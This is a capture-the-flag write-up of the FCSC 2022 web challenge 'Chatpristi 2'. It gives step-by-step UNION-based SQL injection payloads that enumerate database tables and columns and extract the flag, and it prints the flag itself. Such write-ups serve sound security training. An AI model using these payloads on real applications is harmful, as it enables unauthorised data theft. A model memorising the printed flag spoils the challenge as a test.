# Write-up: FCSC 2022 - Web Challenge - Chatpristi 2

## Challenge Description
The challenge consisted of a simple web application featuring a collection of cat memes and a search bar. As soon as I accessed the website, I noticed the search bar, which immediately caught my attention as a possible entry point for injection attacks.

---

## Reconnaissance
I started by exploring the web page to understand its layout and possible vulnerabilities. The search bar seemed like a great candidate to test for SQL Injection vulnerabilities, as such fields often interact with the database.

---

## SQL Injection Testing and Exploitation

### Step 1: Testing for the Number of Columns
To determine the number of columns in the vulnerable table, I began with a basic payload:

    ') UNION SELECT null --
  This produced an error indicating a column mismatch. I iteratively increased the number of null values until no error was returned:

    ') UNION SELECT null, null, null--
  This confirmed that the table had three columns.

### Step 2: Determining Column Data Types
  Next, I tested the data types for each column by replacing null with test values:

    ') UNION SELECT 1, 'a', 'a'--
  The query executed successfully, indicating the first column was of type int and the other two were string.

### Step 3: Enumerating Tables
  To identify all tables in the database, I executed the following payload:

    ') UNION SELECT 1, 'i', table_name FROM information_schema.tables--
   This listed all tables in the database. Among the results, one table stood out:
        
                  ___youw1lln3verfindmyfl4g___.

### Step 4: Enumerating Columns in the Target Table
   I then explored the columns of the target table using this payload:

    ') UNION SELECT 1, 'i', column_name FROM information_schema.columns WHERE table_name = '___youw1lln3verfindmyfl4g___'--
  The query returned two columns:

              id
              fstbg0adwb8f5upmg
              
### Step 5: Retrieving the Flag
  Finally, I crafted a payload to extract the contents of the table:

  ') UNION SELECT 1, id::text, fstbg0adwb8f5upmg FROM ___youw1lln3verfindmyfl4g___--

   This query revealed the flag stored in the table:

                    FCSC{edfaeb139255929e55a3cffe9f3f37cd4e871e5015c4d4ade2b02d77d44019e5}
  Final Results:
  The SQL injection exploitation confirmed the vulnerability and successfully extracted the flag.
